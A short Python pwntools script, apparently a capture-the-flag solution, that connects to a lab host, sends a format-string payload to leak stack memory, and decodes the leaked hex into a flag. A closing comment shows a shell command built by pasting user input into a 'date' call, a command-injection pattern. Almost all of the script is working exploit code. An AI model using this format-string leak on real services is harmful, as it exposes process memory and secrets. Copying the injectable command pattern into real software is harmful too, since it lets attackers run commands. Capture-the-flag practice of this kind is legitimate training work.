from pwn import *

p = remote('10.10.247.172', 9006)
p.recvuntil(b'giveaway: ')
payload = b'%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX'
p.sendline(payload)
result = p.recv().strip().split(b' ')[1].split(b'.')
flag = ""
for word in result:
    flag += bytes.fromhex(word.decode("utf-8"))[::-1].decode("utf-8")
print("This is the flag {}".format(flag))


# "date '+" . $format ."' 2>&1"